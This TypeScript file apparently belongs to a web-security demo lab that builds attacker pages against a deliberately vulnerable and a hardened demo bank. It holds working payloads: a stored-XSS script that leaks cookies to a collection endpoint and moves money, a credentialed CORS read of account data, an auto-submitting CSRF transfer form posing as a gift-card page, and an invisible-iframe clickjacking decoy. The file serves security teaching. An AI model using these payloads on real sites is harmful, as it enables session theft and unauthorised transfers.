import { escapeHtml, hostWarning, js, layout, personaUrl, TARGET_LABEL } from './pages.js';
import type { AttackInfo, PageContext, Target } from './types.js';

const TARGETS: readonly Target[] = ['vulnerable', 'hardened'];

// ---------------------------------------------------------------------------
// F-01 Stored XSS
// ---------------------------------------------------------------------------

/**
 * Payload posted on the bank's community board. When alice views the board it:
 *  1. sends her session cookie to the loot panel (works because the vulnerable
 *     cookie has no HttpOnly and the weak CSP allows img-src *),
 *  2. reads the CSRF token from the page's own form and transfers €100 to mallory.
 * Step 2 works even with HttpOnly: XSS runs *as the user*.
 */
function xssPayload(ctx: PageContext, target: Target): string {
  const collect = `${ctx.collectOrigin}/collect?target=${target}&data=`;
  // Runs once the whole page is parsed: the post form (and its CSRF token) comes after the posts.
  return `<script>
addEventListener('DOMContentLoaded', async () => {
  const me = /Post as (\\w+)/.exec(document.body.innerText)?.[1];
  if (!me || me === 'mallory') return; // only fire for victims
  const leak = (d) => { new Image().src = ${js(collect)} + encodeURIComponent(d); };
  leak(me + ' cookie: ' + (document.cookie || '(nothing readable: HttpOnly)'));
  const csrf = document.querySelector('input[name=csrf]')?.value ?? '';
  const body = new URLSearchParams({ csrf, to: 'mallory', amount: '100' });
  const res = await fetch('/transfer', { method: 'POST', body });
  leak(me + ' sent €100 to mallory: HTTP ' + res.status);
});
</script>`;
}

const xss: AttackInfo = {
  id: 'xss',
  title: 'Stored XSS through a "present" CSP',
  finding: 'F-01',
  path: '/xss',
  personas: ['attacker'],
  summary: 'Mallory posts a script on the community board; it steals the cookie of whoever reads it and moves money as them.',
  entries: [{ label: 'Payloads + steps', persona: 'attacker' }],
  render(ctx) {
    const columns = TARGETS.map((target) => {
      const board = `${ctx.targets[target]}/board`;
      return `<div class="card">
        <h2>${TARGET_LABEL[target]}</h2>
        <p><a href="${escapeHtml(board)}" target="_blank">${escapeHtml(board)}</a></p>
        <textarea id="payload-${target}" readonly>${escapeHtml(xssPayload(ctx, target))}</textarea>
        <p><button data-copy="payload-${target}">Copy payload</button></p>
      </div>`;
    }).join('');

    return layout(
      ctx.host,
      this.title,
      `<h1>${this.finding} · ${escapeHtml(this.title)}</h1>
      ${hostWarning(ctx, this)}
      <ol class="card">
        <li>Open an <strong>Incognito window</strong> of the demo Chrome (separate cookies), log in to a bank as
          <code>mallory / mallory123</code> and post the matching payload on the community board.</li>
        <li>In the normal window, logged in as <strong>alice</strong>, open the same bank's community board.</li>
        <li>Watch the <a href="/loot" target="_blank">loot panel</a> and alice's transactions.
          Every view of the board sends another €100.</li>
      </ol>
      <div class="cols">${columns}</div>
      <p class="muted">Expected: vulnerable → cookie + transfer in the loot panel.
        Hardened → the payload is shown as text (output encoding); even unencoded, the nonce-based CSP would block it.</p>
      <script>
        for (const button of document.querySelectorAll('[data-copy]')) {
          button.onclick = async () => {
            const area = document.getElementById(button.dataset.copy);
            area.select();
            try { await navigator.clipboard.writeText(area.value); } catch { document.execCommand('copy'); }
            button.textContent = 'Copied';
          };
        }
      </script>`,
    );
  },
};

// ---------------------------------------------------------------------------
// F-02 CORS
// ---------------------------------------------------------------------------

const cors: AttackInfo = {
  id: 'cors',
  title: 'CORS substring check: read the account and CSRF token',
  finding: 'F-02',
  path: '/cors',
  personas: ['evilbank'],
  summary: 'evilbank.localhost contains "bank.localhost", so the vulnerable bank lets it read alice\'s account with her cookies.',
  entries: [{ label: 'Steal account data', persona: 'evilbank' }],
  render(ctx) {
    const columns = TARGETS.map(
      (target) => `<div class="card">
        <h2>${TARGET_LABEL[target]}</h2>
        <p class="muted"><code>GET ${escapeHtml(ctx.targets[target])}/api/account</code></p>
        <div id="out-${target}" class="muted">Not run yet.</div>
      </div>`,
    ).join('');

    return layout(
      ctx.host,
      this.title,
      `<h1>${this.finding} · ${escapeHtml(this.title)}</h1>
      ${hostWarning(ctx, this)}
      <p class="card">This page runs on <code>${escapeHtml(ctx.host)}</code>, a different site from both banks.
        It asks the browser to fetch alice's account <em>with her cookies</em> and tries to read the answer.
        <br><br><button id="run">Steal alice's account from both banks</button></p>
      <div class="cols">${columns}</div>
      <p class="muted">Expected: vulnerable → JSON with balance, transactions and CSRF token.
        Hardened → blocked by the browser (no Access-Control-Allow-Origin; the SameSite=Lax cookie isn't sent either).
        Details in DevTools → Console / Network.</p>
      <script>
        const targets = ${js(ctx.targets)};
        const report = (event) =>
          fetch('/report', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(event) });
        const show = (target, cls, title, detail) => {
          const out = document.getElementById('out-' + target);
          const strong = document.createElement('div');
          strong.className = cls;
          strong.textContent = title;
          const pre = document.createElement('pre');
          pre.textContent = detail;
          out.className = '';
          out.replaceChildren(strong, pre);
        };
        async function steal(target) {
          try {
            const res = await fetch(targets[target] + '/api/account', { credentials: 'include' });
            const text = await res.text();
            if (!res.ok) {
              show(target, 'blocked', 'Readable, but HTTP ' + res.status + ': no session cookie was sent', text);
              report({ kind: 'blocked', target, attack: 'cors', reason: 'HTTP ' + res.status + ' (no session cookie)' });
              return;
            }
            let pretty = text;
            try { pretty = JSON.stringify(JSON.parse(text), null, 2); } catch {}
            show(target, 'leaked', 'LEAKED', pretty);
            report({ kind: 'cors-read', target, data: text });
          } catch (error) {
            show(target, 'blocked', 'Blocked by the browser', String(error) + '\\n(see Console for the CORS error)');
            report({ kind: 'blocked', target, attack: 'cors', reason: String(error) });
          }
        }
        document.getElementById('run').onclick = () => { steal('vulnerable'); steal('hardened'); };
      </script>`,
    );
  },
};

// ---------------------------------------------------------------------------
// F-03 CSRF
// ---------------------------------------------------------------------------

const CSRF_AMOUNT = '100';

const csrf: AttackInfo = {
  id: 'csrf',
  title: 'Cross-site request forgery',
  finding: 'F-03',
  path: '/csrf',
  personas: ['attacker', 'evil-safe-subdomain'],
  summary: 'Just visiting the page submits a hidden "send €100 to mallory" form to the bank, carrying alice\'s cookie.',
  entries: [
    { label: 'Vulnerable bank, cross-site attacker → transfer goes through', persona: 'attacker', query: 'target=vulnerable' },
    { label: 'Hardened bank, cross-site attacker → 401 (SameSite=Lax keeps the cookie back)', persona: 'attacker', query: 'target=hardened' },
    { label: 'Hardened bank, SAME-SITE attacker → 403 (cookie sent, CSRF token missing)', persona: 'evil-safe-subdomain', query: 'target=hardened' },
  ],
  render(ctx) {
    if (ctx.target === undefined) {
      const links = this.entries
        .map((e) => {
          const url = personaUrl(e.persona, ctx.port, `${this.path}?${e.query ?? ''}`);
          return `<li><a href="${escapeHtml(url)}" target="_blank">${escapeHtml(e.label)}</a></li>`;
        })
        .join('');
      return layout(
        ctx.host,
        this.title,
        `<h1>${this.finding} · ${escapeHtml(this.title)}</h1>
        ${hostWarning(ctx, this)}
        <div class="card"><p>Each link opens a page that auto-submits a transfer as soon as it loads.</p><ul>${links}</ul></div>`,
      );
    }

    // The actual attack page: looks harmless, submits a top-level POST on load.
    const action = `${ctx.targets[ctx.target]}/transfer`;
    return layout(
      ctx.host,
      'Claim your gift card',
      `${hostWarning(ctx, this)}
      <h1>🎁 Loading your free gift card…</h1>
      <p class="muted">(Hidden form → <code>POST ${escapeHtml(action)}</code>, to=mallory, amount=€${CSRF_AMOUNT}, no CSRF token)</p>
      <form id="csrf" method="post" action="${escapeHtml(action)}">
        <input type="hidden" name="to" value="mallory">
        <input type="hidden" name="amount" value="${CSRF_AMOUNT}">
      </form>
      <script>setTimeout(() => document.getElementById('csrf').submit(), 1200);</script>`,
    );
  },
};

// ---------------------------------------------------------------------------
// F-04 Clickjacking
// ---------------------------------------------------------------------------

/**
 * Where the bank's "Confirm transfer" button sits inside the framed page
 * (see .confirm / .confirm-button in bank/public/style.css). The decoy button
 * is placed at exactly the same spot, under the invisible frame.
 */
const FRAME = { width: 720, height: 400 } as const;
const BUTTON = { left: 16, top: 260, width: 240, height: 56 } as const;
const PRIZE_AMOUNT = '500';

const clickjacking: AttackInfo = {
  id: 'clickjacking',
  title: 'Clickjacking: "Claim your prize"',
  finding: 'F-04',
  path: '/prize',
  personas: ['attacker'],
  summary: 'An invisible frame of the bank\'s "Confirm transfer" page sits exactly on top of a "Claim your prize" button.',
  entries: [
    { label: 'Against the vulnerable bank', persona: 'attacker', query: 'target=vulnerable' },
    { label: 'Against the hardened bank', persona: 'attacker', query: 'target=hardened' },
  ],
  render(ctx) {
    const target: Target = ctx.target ?? 'vulnerable';
    const src = `${ctx.targets[target]}/transfer?to=mallory&amount=${PRIZE_AMOUNT}`;
    return layout(
      ctx.host,
      'You won!',
      `${hostWarning(ctx, this)}
      <style>
        .stage { position: relative; width: ${FRAME.width}px; height: ${FRAME.height}px; margin-top: 16px;
                 background: linear-gradient(135deg, #5b1a6b, #1b1023); border-radius: 8px; overflow: hidden; }
        .stage h2 { position: absolute; left: 16px; top: 90px; margin: 0; font-size: 32px; }
        .stage p { position: absolute; left: 16px; top: 150px; margin: 0; }
        .decoy { position: absolute; left: ${BUTTON.left}px; top: ${BUTTON.top}px;
                 width: ${BUTTON.width}px; height: ${BUTTON.height}px; font-size: 18px; font-weight: 700; }
        .stage iframe { position: absolute; left: 0; top: 0; width: ${FRAME.width}px; height: ${FRAME.height}px;
                        border: 0; opacity: 0; z-index: 2; }
      </style>
      <h1>🎉 Congratulations!</h1>
      <p class="muted">Target: ${TARGET_LABEL[target]} ·
        Reveal hidden frame <input id="reveal" type="range" min="0" max="100" value="0"> <span id="pct">0%</span></p>
      <div class="stage">
        <h2>You won a €${PRIZE_AMOUNT} voucher</h2>
        <p>One click to claim it. Offer ends in 00:59.</p>
        <button class="decoy">Claim your prize</button>
        <iframe id="frame" src="${escapeHtml(src)}" title="hidden"></iframe>
      </div>
      <p class="muted">Expected: vulnerable → the click lands on "Confirm transfer" (check alice's transactions).
        Hardened → the browser refuses to frame the page (X-Frame-Options / frame-ancestors); move the slider to see it.</p>
      <script>
        const reveal = document.getElementById('reveal');
        reveal.oninput = () => {
          document.getElementById('frame').style.opacity = String(reveal.value / 100);
          document.getElementById('pct').textContent = reveal.value + '%';
        };
      </script>`,
    );
  },
};

/** The attack catalogue: landing page links and page renderers. */
export const ATTACKS: readonly AttackInfo[] = [xss, cors, csrf, clickjacking];
